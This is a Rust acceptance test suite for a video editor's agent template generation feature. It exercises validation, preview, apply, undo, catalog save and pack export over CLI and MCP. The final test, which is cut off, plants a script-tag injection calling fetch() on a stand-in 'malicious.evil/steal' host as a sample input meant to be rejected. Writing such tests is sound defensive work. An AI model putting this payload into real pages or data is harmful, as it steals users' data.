//! Phase 35 Acceptance Test Suite
//! Agent Template Generation & Refinement via CLI/MCP
//! Governed by Plans/plan_phase35_agent_template_generation.md, ADR-005, and ADR-001 v3.

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use tinixcut_lib::modules::automation::mcp::TinixCutMcpServer;
use tinixcut_lib::modules::automation::AutomationAdapter;
use tinixcut_lib::modules::domain::template::{
    ResponsivePolicy, TemplateLayer, TemplateLayerKind, TemplateParameterBinding,
    TemplateParameterDefinition, TemplateParameterType, TemplateParameterValue,
    TemplatePropertyPath, TemplateResourceManifest, TemplateShapeKind, TemplateShapeLayerData,
    TemplateTextLayerData,
};
use tinixcut_lib::modules::domain::text::{
    AnimationTransform, AnimationUnit, DurationConflictPolicy, FontReference, FontStyle,
    GradientKind, GradientSpace, GradientStop, LoopMode, StaggerOrder, TextAnimation,
    TextAnimationSegment, TextFill, TextLayout, TextRichStyle, TextShadow, TextStroke,
};
use tinixcut_lib::modules::domain::time::{FrameRate, RationalTime, TimeRange};
use tinixcut_lib::modules::domain::{
    ItemKind, KeyframeEasing, Project, TextAnchor, TextStyle, TimelineItem, Track, TrackKind,
    Transform,
};
use tinixcut_lib::modules::export::{ExportEngine, ExportProfile};
use tinixcut_lib::modules::persistence::{load_project, save_project_atomic};
use tinixcut_lib::modules::templates::agent::{
    AgentTemplateService, TemplateDraft, TemplateDraftProvenance, TemplateDraftSlot,
};
use tinixcut_lib::modules::templates::catalog::TemplateCatalog;
use tinixcut_lib::modules::templates::pack::{TemplatePackManifest, TemplatePackService};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader as TokioBufReader};

static NEXT_REQ_ID: AtomicU64 = AtomicU64::new(1);

fn next_id() -> u64 {
    NEXT_REQ_ID.fetch_add(1, Ordering::SeqCst)
}

struct TempDirGuard {
    path: PathBuf,
}

impl Drop for TempDirGuard {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

impl AsRef<Path> for TempDirGuard {
    fn as_ref(&self) -> &Path {
        &self.path
    }
}

fn test_dir(name: &str) -> TempDirGuard {
    let dir = std::env::temp_dir().join(format!("tinixcut_p35_{}_{}", name, next_id()));
    if dir.exists() {
        let _ = fs::remove_dir_all(&dir);
    }
    fs::create_dir_all(&dir).expect("Failed to create test directory");
    TempDirGuard { path: dir }
}

fn create_base_project(name: &str) -> Project {
    let mut project = Project::new(name.to_string());
    project.settings.width = 1920;
    project.settings.height = 1080;
    project.settings.frame_rate = FrameRate::FPS_30;
    project
        .tracks
        .push(Track::new("Video Track 1".to_string(), TrackKind::Video));
    project
}

fn create_text_item(id: &str, text: &str, duration_frames: i64) -> TimelineItem {
    let fps = FrameRate::FPS_30;
    let mut item = TimelineItem::new(
        None,
        format!("Clip_{id}"),
        ItemKind::Text,
        TimeRange::new(
            RationalTime::zero(fps),
            RationalTime::new(duration_frames, fps),
        ),
        TimeRange::new(
            RationalTime::zero(fps),
            RationalTime::new(duration_frames, fps),
        ),
    )
    .expect("Valid timeline item");
    item.item_id = id.to_string();
    item.text_content = Some(text.to_string());
    item
}

fn create_vietnamese_title_draft_v1() -> TemplateDraft {
    let fps = FrameRate::FPS_30;

    let rich_style = TextRichStyle {
        fill: TextFill::Gradient {
            gradient_kind: GradientKind::Linear,
            angle_deg: 45.0,
            radius: None,
            space: GradientSpace::All,
            stops: vec![
                GradientStop {
                    offset: 0.0,
                    color: "#FFD700".to_string(),
                },
                GradientStop {
                    offset: 1.0,
                    color: "#FF4500".to_string(),
                },
            ],
        },
        font: Some(FontReference {
            family: "Roboto".to_string(),
            weight: 700,
            style: FontStyle::Normal,
            asset_id: None,
        }),
        font_size: Some(80.0),
        layout: TextLayout::default(),
        strokes: vec![TextStroke {
            color: "#8B0000".to_string(),
            width: 4.0,
            align: tinixcut_lib::modules::domain::text::StrokeAlign::Outside,
        }],
        shadows: vec![TextShadow {
            color: "#000000AA".to_string(),
            offset_x: 6.0,
            offset_y: 6.0,
            blur: 8.0,
        }],
        background: None,
        spans: Vec::new(),
    };

    let animation = TextAnimation {
        unit: AnimationUnit::Grapheme,
        order: StaggerOrder::Forward,
        seed: None,
        pivot_x: 0.5,
        pivot_y: 0.5,
        in_anim: Some(TextAnimationSegment {
            duration: RationalTime::new(18, fps),
            easing: KeyframeEasing::EaseOut,
            stagger_ratio: 0.2,
            from: AnimationTransform {
                translate_x: 0.0,
                translate_y: 40.0,
                scale_x: 0.8,
                scale_y: 0.8,
                rotation: 0.0,
                opacity: 0.0,
            },
            to: AnimationTransform::default(),
        }),
        loop_anim: None,
        out_anim: Some(TextAnimationSegment {
            duration: RationalTime::new(12, fps),
            easing: KeyframeEasing::EaseIn,
            stagger_ratio: 0.2,
            from: AnimationTransform::default(),
            to: AnimationTransform {
                translate_x: 0.0,
                translate_y: -30.0,
                scale_x: 1.0,
                scale_y: 1.0,
                rotation: 0.0,
                opacity: 0.0,
            },
        }),
        loop_mode: LoopMode::None,
        conflict_policy: DurationConflictPolicy::ProportionalScale,
        phase_origin: None,
        phase_end: None,
    };

    let primary_layer = TemplateLayer {
        layer_id: "title_layer".to_string(),
        name: "Main Title".to_string(),
        z_index: 1,
        visible: true,
        opacity: 1.0,
        transform: Transform::default(),
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: Some(animation.clone()),
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: true,
            slot_key: Some("title".to_string()),
            text_content: Some("Hào Khí Việt Nam".to_string()),
            text_style: Some(TextStyle {
                font_family: "Roboto".to_string(),
                font_size: 80.0,
                font_color: "#FFD700".to_string(),
                ..Default::default()
            }),
            text_rich: Some(rich_style),
            text_animation: Some(animation),
        }),
    };

    let dec_shape_layer = TemplateLayer {
        layer_id: "accent_bar".to_string(),
        name: "Accent Underline".to_string(),
        z_index: 0,
        visible: true,
        opacity: 0.85,
        transform: Transform {
            position_x: 0.0,
            position_y: 70.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Shape(TemplateShapeLayerData {
            shape_kind: TemplateShapeKind::RoundedRectangle,
            width: 400.0,
            height: 8.0,
            fill_color: Some("#FFD700".to_string()),
            stroke_color: None,
            stroke_width: 0.0,
            corner_radius: 4.0,
        }),
    };

    TemplateDraft {
        draft_id: "draft_vn_title_v1".to_string(),
        schema_version: 1,
        template_id: "vn_hao_khi".to_string(),
        template_version: 1,
        name: "Hào Khí Việt Nam Title".to_string(),
        category: "Title".to_string(),
        description: "Vietnamese patriotic animated title with gold-red gradient, outer stroke and grapheme animation".to_string(),
        tags: vec!["vietnamese".to_string(), "gradient".to_string(), "animated".to_string(), "title".to_string()],
        slots: vec![TemplateDraftSlot {
            slot_key: "title".to_string(),
            name: "Main Title Text".to_string(),
            slot_type: "text".to_string(),
            description: Some("Headline text in Vietnamese".to_string()),
            required: true,
        }],
        parameters: vec![
            TemplateParameterDefinition {
                key: "accent_color".to_string(),
                name: "Accent Bar Color".to_string(),
                param_type: TemplateParameterType::Color,
                default_value: TemplateParameterValue::Color("#FFD700".to_string()),
                description: Some("Color of bottom underline".to_string()),
            },
            TemplateParameterDefinition {
                key: "bar_width".to_string(),
                name: "Accent Bar Width".to_string(),
                param_type: TemplateParameterType::Number { min: 50.0, max: 1200.0, step: 10.0 },
                default_value: TemplateParameterValue::Number(400.0),
                description: Some("Width of accent bar".to_string()),
            },
        ],
        bindings: vec![
            TemplateParameterBinding {
                parameter_key: "accent_color".to_string(),
                target_layer_id: "accent_bar".to_string(),
                target_property: TemplatePropertyPath::FillColor,
            },
            TemplateParameterBinding {
                parameter_key: "bar_width".to_string(),
                target_layer_id: "accent_bar".to_string(),
                target_property: TemplatePropertyPath::Width,
            },
        ],
        layers: vec![dec_shape_layer, primary_layer],
        resources: TemplateResourceManifest::default(),
        responsive_policy: ResponsivePolicy::default(),
        default_duration: RationalTime::new(90, fps),
        provenance: TemplateDraftProvenance {
            author_type: "agent".to_string(),
            agent_id: Some("tinix-creative-agent".to_string()),
            agent_version: Some("1.2.0".to_string()),
            prompt: Some("Create an epic Vietnamese patriotic title with gradient fill and character animations".to_string()),
            reference_summary: Some("Reference style: Golden red festival title".to_string()),
            parent_draft_id: None,
            iteration: 1,
            unsupported_approximations: Vec::new(),
            required_missing_resources: Vec::new(),
            created_at: chrono::Utc::now().to_rfc3339(),
        },
        user_overrides: Vec::new(),
    }
}

fn create_vietnamese_title_draft_v2_refined(parent: &TemplateDraft) -> TemplateDraft {
    let mut refined = parent.clone();
    refined.draft_id = "draft_vn_title_v2_refined".to_string();
    refined.provenance.parent_draft_id = Some(parent.draft_id.clone());
    refined.provenance.iteration = 2;
    refined.provenance.prompt = Some("Less shadow blur and cooler cyan-blue gradient".to_string());

    // Refine primary layer: reduce shadow blur from 8 to 4, update gradient to cyan-blue
    if let Some(primary) = refined
        .layers
        .iter_mut()
        .find(|l| l.layer_id == "title_layer")
    {
        if let TemplateLayerKind::Text(ref mut t) = primary.kind {
            if let Some(ref mut rich) = t.text_rich {
                rich.shadows = vec![TextShadow {
                    color: "#00000088".to_string(),
                    offset_x: 3.0,
                    offset_y: 3.0,
                    blur: 3.0, // Reduced shadow
                }];
                rich.fill = TextFill::Gradient {
                    gradient_kind: GradientKind::Linear,
                    angle_deg: 90.0,
                    radius: None,
                    space: GradientSpace::All,
                    stops: vec![
                        GradientStop {
                            offset: 0.0,
                            color: "#00FFFF".to_string(),
                        },
                        GradientStop {
                            offset: 1.0,
                            color: "#0077FF".to_string(),
                        },
                    ],
                };
            }
        }
    }

    // Refine accent bar binding default
    if let Some(p) = refined
        .parameters
        .iter_mut()
        .find(|p| p.key == "accent_color")
    {
        p.default_value = TemplateParameterValue::Color("#00FFFF".to_string());
    }

    refined
}

fn create_multilayer_quote_card_draft() -> TemplateDraft {
    let fps = FrameRate::FPS_30;

    let card_bg = TemplateLayer {
        layer_id: "card_bg".to_string(),
        name: "Card Background".to_string(),
        z_index: 0,
        visible: true,
        opacity: 0.95,
        transform: Transform::default(),
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Shape(TemplateShapeLayerData {
            shape_kind: TemplateShapeKind::RoundedRectangle,
            width: 800.0,
            height: 360.0,
            fill_color: Some("#1E1E2E".to_string()),
            stroke_color: Some("#89B4FA".to_string()),
            stroke_width: 3.0,
            corner_radius: 18.0,
        }),
    };

    let quote_text = TemplateLayer {
        layer_id: "quote_text".to_string(),
        name: "Quote Body".to_string(),
        z_index: 1,
        visible: true,
        opacity: 1.0,
        transform: Transform {
            position_x: 0.0,
            position_y: -30.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: true,
            slot_key: Some("quote".to_string()),
            text_content: Some("Học, học nữa, học mãi".to_string()),
            text_style: Some(TextStyle {
                font_family: "Inter".to_string(),
                font_size: 42.0,
                font_color: "#CDD6F4".to_string(),
                ..Default::default()
            }),
            text_rich: None,
            text_animation: None,
        }),
    };

    let author_text = TemplateLayer {
        layer_id: "author_text".to_string(),
        name: "Author Subtitle".to_string(),
        z_index: 2,
        visible: true,
        opacity: 0.8,
        transform: Transform {
            position_x: 200.0,
            position_y: 80.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::MiddleRight,
        pivot: (1.0, 0.5),
        motion: None,
        kind: TemplateLayerKind::Text(TemplateTextLayerData {
            is_primary: false,
            slot_key: Some("author".to_string()),
            text_content: Some("— V. I. Lênin".to_string()),
            text_style: Some(TextStyle {
                font_family: "Inter".to_string(),
                font_size: 26.0,
                font_color: "#A6ADC8".to_string(),
                ..Default::default()
            }),
            text_rich: None,
            text_animation: None,
        }),
    };

    TemplateDraft {
        draft_id: "draft_quote_card_v1".to_string(),
        schema_version: 1,
        template_id: "quote_card_modern".to_string(),
        template_version: 1,
        name: "Modern Quote Card".to_string(),
        category: "QuoteCard".to_string(),
        description: "Elegant rounded quote card with author attribution".to_string(),
        tags: vec![
            "quote".to_string(),
            "card".to_string(),
            "education".to_string(),
        ],
        slots: vec![
            TemplateDraftSlot {
                slot_key: "quote".to_string(),
                name: "Quote Statement".to_string(),
                slot_type: "text".to_string(),
                description: Some("The main quote text".to_string()),
                required: true,
            },
            TemplateDraftSlot {
                slot_key: "author".to_string(),
                name: "Author Name".to_string(),
                slot_type: "text".to_string(),
                description: Some("Attribution line".to_string()),
                required: false,
            },
        ],
        parameters: vec![TemplateParameterDefinition {
            key: "border_color".to_string(),
            name: "Card Border Color".to_string(),
            param_type: TemplateParameterType::Color,
            default_value: TemplateParameterValue::Color("#89B4FA".to_string()),
            description: None,
        }],
        bindings: vec![TemplateParameterBinding {
            parameter_key: "border_color".to_string(),
            target_layer_id: "card_bg".to_string(),
            target_property: TemplatePropertyPath::StrokeColor,
        }],
        layers: vec![card_bg, quote_text, author_text],
        resources: TemplateResourceManifest::default(),
        responsive_policy: ResponsivePolicy::default(),
        default_duration: RationalTime::new(90, fps),
        provenance: TemplateDraftProvenance {
            author_type: "agent".to_string(),
            agent_id: Some("tinix-quote-bot".to_string()),
            agent_version: Some("2.0.0".to_string()),
            prompt: Some("Create a clean quote card for educational videos".to_string()),
            reference_summary: Some("Inspirational quote card layout".to_string()),
            parent_draft_id: None,
            iteration: 1,
            unsupported_approximations: vec!["CustomFont(Playfair)".to_string()],
            required_missing_resources: vec!["quote_icon_missing.png".to_string()],
            created_at: chrono::Utc::now().to_rfc3339(),
        },
        user_overrides: Vec::new(),
    }
}

struct DuplexMcpClient {
    reader: TokioBufReader<tokio::io::ReadHalf<tokio::io::DuplexStream>>,
    writer: tokio::io::WriteHalf<tokio::io::DuplexStream>,
}

impl DuplexMcpClient {
    async fn new(server: TinixCutMcpServer) -> Self {
        let (client_io, server_io) = tokio::io::duplex(131072);
        tokio::spawn(async move {
            if let Ok(running) = rmcp::serve_server(server, server_io).await {
                let _ = running.waiting().await;
            }
        });
        let (read_half, write_half) = tokio::io::split(client_io);
        Self {
            reader: TokioBufReader::new(read_half),
            writer: write_half,
        }
    }

    async fn send_request(
        &mut self,
        method: &str,
        mut params: serde_json::Value,
    ) -> serde_json::Value {
        let id = next_id();
        if let Some(map) = params.as_object_mut() {
            if !map.contains_key("_meta") {
                map.insert(
                    "_meta".to_string(),
                    serde_json::json!({
                        "io.modelcontextprotocol/protocolVersion": "2026-07-28",
                        "io.modelcontextprotocol/clientCapabilities": {},
                        "io.modelcontextprotocol/clientInfo": {
                            "name": "phase35-test-client",
                            "version": "1.0.0"
                        }
                    }),
                );
            }
        }

        let req = serde_json::json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": method,
            "params": params,
        });

        let mut line = serde_json::to_string(&req).unwrap();
        line.push('\n');
        self.writer.write_all(line.as_bytes()).await.unwrap();
        self.writer.flush().await.unwrap();

        let mut resp_line = String::new();
        tokio::time::timeout(
            std::time::Duration::from_secs(15),
            self.reader.read_line(&mut resp_line),
        )
        .await
        .expect("MCP request timed out after 15s")
        .expect("Failed to read from MCP stream");
        if resp_line.trim().is_empty() {
            panic!("MCP server closed connection (EOF) without response");
        }
        serde_json::from_str(&resp_line).expect("Valid JSON-RPC response frame")
    }

    async fn call_tool(&mut self, tool_name: &str, args: serde_json::Value) -> serde_json::Value {
        self.send_request(
            "tools/call",
            serde_json::json!({
                "name": tool_name,
                "arguments": args,
            }),
        )
        .await
    }
}

// ============================================================================
// Acceptance Tests (Phase 35)
// ============================================================================

#[tokio::test]
async fn test_p35_ac01_capabilities_and_schema_surface_cli_and_mcp() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Query MCP tinixcut_capabilities
    let mcp_res = client
        .call_tool("tinixcut_capabilities", serde_json::json!({}))
        .await;
    let structured = &mcp_res["result"]["structuredContent"];
    assert!(
        structured.is_object(),
        "MCP capabilities must return structured content"
    );

    let template_caps = &structured["templateCapabilities"];
    assert!(
        template_caps.is_object(),
        "Capabilities must expose templateCapabilities"
    );
    assert_eq!(template_caps["schemaVersion"], 1);
    assert_eq!(template_caps["maxLayers"], 16);
    assert_eq!(template_caps["maxTextSlots"], 8);
    assert_eq!(template_caps["maxGraphemesPerSlot"], 512);
    assert_eq!(template_caps["maxRepairIterations"], 5);

    let supported_layers = template_caps["supportedLayerTypes"].as_array().unwrap();
    assert!(supported_layers.contains(&serde_json::json!("Text")));
    assert!(supported_layers.contains(&serde_json::json!("Shape")));
    assert!(supported_layers.contains(&serde_json::json!("Image")));

    let draft_schema = &template_caps["draftJsonSchema"];
    assert_eq!(draft_schema["title"], "TinixCutTemplateDraft");
    assert_eq!(draft_schema["type"], "object");

    // 2. Query CLI template capabilities and schema
    let cli_caps_str =
        AutomationAdapter::handle_cli(&["template".to_string(), "capabilities".to_string()])
            .expect("CLI template capabilities must succeed");
    let cli_caps: serde_json::Value = serde_json::from_str(&cli_caps_str).unwrap();
    assert_eq!(cli_caps["maxLayers"], 16);
    assert_eq!(cli_caps["maxRepairIterations"], 5);

    let cli_schema_str =
        AutomationAdapter::handle_cli(&["template".to_string(), "schema".to_string()])
            .expect("CLI template schema must succeed");
    let cli_schema: serde_json::Value = serde_json::from_str(&cli_schema_str).unwrap();
    assert_eq!(cli_schema["title"], "TinixCutTemplateDraft");
}

#[tokio::test]
async fn test_p35_ac02_vietnamese_title_gradient_stroke_shadow_motion_workflow() {
    let temp = test_dir("ac02_vietnamese");
    let project_path = temp.as_ref().join("project.tcproj");
    let mut base_proj = create_base_project("VietnameseTitleShowcase");
    let item = create_text_item("title_item_1", "Initial Plain Text", 90);
    base_proj.tracks[0].items.push(item);
    save_project_atomic(&base_proj, &project_path).expect("Save base project");

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Create and validate Draft v1 (Vietnamese patriotic title with gradient + stroke + shadow)
    let draft_v1 = create_vietnamese_title_draft_v1();
    let val_res = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_v1 }),
        )
        .await;
    let val_report = &val_res["result"]["structuredContent"];
    assert_eq!(val_report["valid"], true, "Draft v1 must validate cleanly");
    assert_eq!(val_report["issues"].as_array().unwrap().len(), 0);

    // 2. Preview Draft v1 frame at t = 1.0s
    let preview_path = temp.as_ref().join("preview_v1.png");
    let prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft_v1,
                "timeSeconds": 1.0,
                "outputPath": preview_path.to_string_lossy().to_string(),
            }),
        )
        .await;
    let prev_report = &prev_res["result"]["structuredContent"];
    assert_eq!(prev_report["hasVisibleContent"], true);
    assert!(prev_report["nonZeroPixels"].as_u64().unwrap() > 200);
    assert!(preview_path.exists(), "Preview PNG must be written to disk");

    // 3. Refine: produce Candidate Draft v2 ("ít bóng hơn", updated gradient, iteration 2)
    let draft_v2 = create_vietnamese_title_draft_v2_refined(&draft_v1);
    assert_eq!(draft_v2.provenance.iteration, 2);
    assert_eq!(
        draft_v2.provenance.parent_draft_id,
        Some("draft_vn_title_v1".to_string())
    );

    let val_res_v2 = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_v2 }),
        )
        .await;
    assert_eq!(val_res_v2["result"]["structuredContent"]["valid"], true);

    // 4. Apply Draft v2 to the project text item via MCP
    let apply_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "title_item_1",
                "draft": draft_v2,
                "clientId": "test_agent_mcp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_p35_ac02_apply",
                "baseRevision": 0,
            }),
        )
        .await;
    let apply_receipt = &apply_res["result"]["structuredContent"];
    assert_eq!(apply_receipt["templateId"], "vn_hao_khi");
    assert_eq!(apply_receipt["revision"], 1);

    // Verify on-disk project mutation
    let reloaded = load_project(&project_path).expect("Reload mutated project");
    assert_eq!(reloaded.revision, 1);
    let target_item = &reloaded.tracks[0].items[0];
    assert!(target_item.template_instance.is_some());
    let inst = target_item.template_instance.as_ref().unwrap();
    assert_eq!(inst.template_id, "vn_hao_khi");
    assert_eq!(inst.layers.len(), 2);

    // Verify undo/redo restores pre-template state and re-applies cleanly
    let mut history = tinixcut_lib::modules::history::HistoryManager::new(20);
    history.record_edit(tinixcut_lib::modules::history::HistoryEntry {
        description: "Apply Vietnamese Title Template".to_string(),
        transaction_id: Some("tx_p35_ac02_apply".to_string()),
        prior_snapshot: base_proj.clone(),
        resulting_snapshot: reloaded.clone(),
    });
    assert!(history.can_undo());
    let mut undone_proj = reloaded.clone();
    let undo_desc = history.undo(&mut undone_proj);
    assert_eq!(
        undo_desc.as_deref(),
        Some("Apply Vietnamese Title Template")
    );
    assert_eq!(undone_proj.revision, 0);
    assert!(undone_proj.tracks[0].items[0].template_instance.is_none());

    assert!(history.can_redo());
    let mut redone_proj = undone_proj.clone();
    let redo_desc = history.redo(&mut redone_proj);
    assert_eq!(
        redo_desc.as_deref(),
        Some("Apply Vietnamese Title Template")
    );
    assert_eq!(redone_proj.revision, 1);
    assert_eq!(
        redone_proj.tracks[0].items[0]
            .template_instance
            .as_ref()
            .unwrap()
            .template_id,
        "vn_hao_khi"
    );

    // 5. Save definition to catalog
    let catalog_dir = temp.as_ref().join("catalog");
    let save_res = client
        .call_tool(
            "tinixcut_template_save",
            serde_json::json!({
                "draft": draft_v2,
                "catalogDir": catalog_dir.to_string_lossy().to_string(),
                "overwrite": true,
            }),
        )
        .await;
    let save_receipt = &save_res["result"]["structuredContent"];
    assert_eq!(save_receipt["templateId"], "vn_hao_khi");
    assert_eq!(save_receipt["version"], 1);

    // 6. Export portable pack and reopen in fresh catalog
    let pack_path = temp.as_ref().join("vn_hao_khi_pack.tinixtpl");
    let catalog = TemplateCatalog::new(catalog_dir);
    let pack_manifest = TemplatePackManifest {
        pack_id: "pack_vn_title".to_string(),
        pack_version: 1,
        name: "Vietnamese Title Pack".to_string(),
        author: Some("Agent".to_string()),
        description: Some("VN Animated Title Pack".to_string()),
        template_ids: vec!["vn_hao_khi".to_string()],
        created_at: chrono::Utc::now().to_rfc3339(),
    };
    let def = catalog
        .get("vn_hao_khi", 1)
        .expect("Get definition from catalog");
    let resources_map = HashMap::new();
    TemplatePackService::export_pack(&pack_manifest, &[def], &resources_map, &pack_path)
        .expect("Pack export must succeed");
    assert!(pack_path.exists());

    let fresh_catalog_dir = temp.as_ref().join("fresh_catalog");
    let fresh_catalog = TemplateCatalog::new(fresh_catalog_dir);
    fresh_catalog.ensure_dirs().unwrap();
    let import_manifest = TemplatePackService::import_pack(&pack_path, &fresh_catalog)
        .expect("Pack import into fresh catalog must succeed");
    assert_eq!(import_manifest.pack_id, "pack_vn_title");
    assert!(fresh_catalog.get("vn_hao_khi", 1).is_some());

    // 7. Render and Export project snapshot to MP4: renders without agent/model
    let output_mp4 = temp.as_ref().join("export_vn_title.mp4");
    let report =
        ExportEngine::render_snapshot(&reloaded, &output_mp4, &ExportProfile::default(), None)
            .expect("Snapshot export must succeed");
    assert!(report.file_size_bytes > 0);
    assert!(output_mp4.exists());
    assert!(fs::metadata(&output_mp4).unwrap().len() > 0);
}

#[tokio::test]
async fn test_p35_ac03_multilayer_sticker_quote_card_missing_resources_and_approximations() {
    let temp = test_dir("ac03_quotecard");
    let project_path = temp.as_ref().join("project_quote.tcproj");
    let mut base_proj = create_base_project("QuoteProject");
    let item = create_text_item("quote_item_1", "Original Quote", 90);
    base_proj.tracks[0].items.push(item);
    save_project_atomic(&base_proj, &project_path).expect("Save base project");

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    let quote_draft = create_multilayer_quote_card_draft();

    // 1. Validate: should report missing resource & unsupported font approximation as warnings, valid = true
    let val_res = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": quote_draft }),
        )
        .await;
    let report = &val_res["result"]["structuredContent"];
    assert_eq!(
        report["valid"], true,
        "Warnings alone do not invalidate the draft"
    );

    let missing = report["missingResources"].as_array().unwrap();
    assert!(missing.contains(&serde_json::json!("quote_icon_missing.png")));

    let unsupp = report["unsupportedOptions"].as_array().unwrap();
    assert!(unsupp.contains(&serde_json::json!("CustomFont(Playfair)")));

    // 2. Preview frame through shared compositor: must render with fallback primitives
    let preview_path = temp.as_ref().join("quote_preview.png");
    let prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": quote_draft,
                "timeSeconds": 1.0,
                "outputPath": preview_path.to_string_lossy().to_string(),
            }),
        )
        .await;
    let prev_report = &prev_res["result"]["structuredContent"];
    assert_eq!(prev_report["hasVisibleContent"], true);
    assert!(prev_report["nonZeroPixels"].as_u64().unwrap() > 100);

    // 3. Apply via CLI and verify durable project persistence
    let draft_file = temp.as_ref().join("quote_draft.json");
    fs::write(
        &draft_file,
        serde_json::to_string_pretty(&quote_draft).unwrap(),
    )
    .unwrap();

    let cli_output = AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "apply".to_string(),
        project_path.to_string_lossy().to_string(),
        "quote_item_1".to_string(),
        draft_file.to_string_lossy().to_string(),
        "--client-id".to_string(),
        "cli_agent".to_string(),
        "--client-epoch".to_string(),
        "1".to_string(),
        "--sequence".to_string(),
        "1".to_string(),
        "--transaction-id".to_string(),
        "tx_quote_apply_cli".to_string(),
    ])
    .expect("CLI template apply must succeed");

    let cli_receipt: serde_json::Value = serde_json::from_str(&cli_output).unwrap();
    assert_eq!(cli_receipt["templateId"], "quote_card_modern");
    assert_eq!(cli_receipt["revision"], 1);

    let reloaded = load_project(&project_path).expect("Reload project");
    let target = &reloaded.tracks[0].items[0];
    assert_eq!(target.template_instance.as_ref().unwrap().layers.len(), 3);
}

#[tokio::test]
async fn test_p35_ac04_cli_mcp_deterministic_equivalence() {
    let temp = test_dir("ac04_equivalence");
    let draft = create_vietnamese_title_draft_v1();
    let draft_path = temp.as_ref().join("draft.json");
    fs::write(&draft_path, serde_json::to_string(&draft).unwrap()).unwrap();

    // Prepare two identical initial projects
    let path_cli = temp.as_ref().join("project_cli.tcproj");
    let path_mcp = temp.as_ref().join("project_mcp.tcproj");

    let mut p1 = create_base_project("EquivalenceP1");
    p1.tracks[0]
        .items
        .push(create_text_item("item_eq", "Same Base Text", 90));
    let p2 = p1.clone();

    save_project_atomic(&p1, &path_cli).unwrap();
    save_project_atomic(&p2, &path_mcp).unwrap();

    // 1. Apply via CLI
    AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "apply".to_string(),
        path_cli.to_string_lossy().to_string(),
        "item_eq".to_string(),
        draft_path.to_string_lossy().to_string(),
        "--client-id".to_string(),
        "equiv_client".to_string(),
        "--client-epoch".to_string(),
        "1".to_string(),
        "--sequence".to_string(),
        "1".to_string(),
        "--transaction-id".to_string(),
        "tx_eq_1".to_string(),
    ])
    .unwrap();

    // 2. Apply via MCP
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;
    let mcp_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": path_mcp.to_string_lossy().to_string(),
                "itemId": "item_eq",
                "draft": draft,
                "clientId": "equiv_client",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_eq_1",
                "baseRevision": 0,
            }),
        )
        .await;
    assert!(mcp_res["result"]["structuredContent"].is_object());

    // 3. Verify equivalent canonical project state
    let res_cli = load_project(&path_cli).unwrap();
    let res_mcp = load_project(&path_mcp).unwrap();

    assert_eq!(res_cli.revision, res_mcp.revision);
    assert_eq!(res_cli.tracks[0].items.len(), res_mcp.tracks[0].items.len());

    let inst_cli = res_cli.tracks[0].items[0]
        .template_instance
        .as_ref()
        .unwrap();
    let inst_mcp = res_mcp.tracks[0].items[0]
        .template_instance
        .as_ref()
        .unwrap();
    assert_eq!(inst_cli.template_id, inst_mcp.template_id);
    assert_eq!(inst_cli.layers.len(), inst_mcp.layers.len());

    // 4. Verify preview frame renders identically via CLI and MCP adapters
    let preview_cli_path = temp.as_ref().join("preview_cli.png");
    AutomationAdapter::handle_cli(&[
        "template".to_string(),
        "preview".to_string(),
        draft_path.to_string_lossy().to_string(),
        preview_cli_path.to_string_lossy().to_string(),
        "--time".to_string(),
        "1.0".to_string(),
        "--width".to_string(),
        "640".to_string(),
        "--height".to_string(),
        "360".to_string(),
    ])
    .expect("CLI template preview must succeed");
    assert!(preview_cli_path.exists());
    let bytes_cli = fs::read(&preview_cli_path).expect("Read CLI preview png");

    let preview_mcp_path = temp.as_ref().join("preview_mcp.png");
    let mcp_prev_res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "timeSeconds": 1.0,
                "outputPath": preview_mcp_path.to_string_lossy().to_string(),
                "width": 640,
                "height": 360,
            }),
        )
        .await;
    let mcp_prev_report = &mcp_prev_res["result"]["structuredContent"];
    assert_eq!(mcp_prev_report["hasVisibleContent"], true);
    assert!(preview_mcp_path.exists());
    let bytes_mcp = fs::read(&preview_mcp_path).expect("Read MCP preview png");

    assert_eq!(
        bytes_cli, bytes_mcp,
        "CLI and MCP preview adapters must produce identical PNG bytes"
    );
}

#[tokio::test]
async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields() {
    // 1. Script tag injection in prompt
    let mut draft_script = create_vietnamese_title_draft_v1();
    draft_script.provenance.prompt =
        Some("<script>fetch('http://malicious.evil/steal')</script>".to_string());
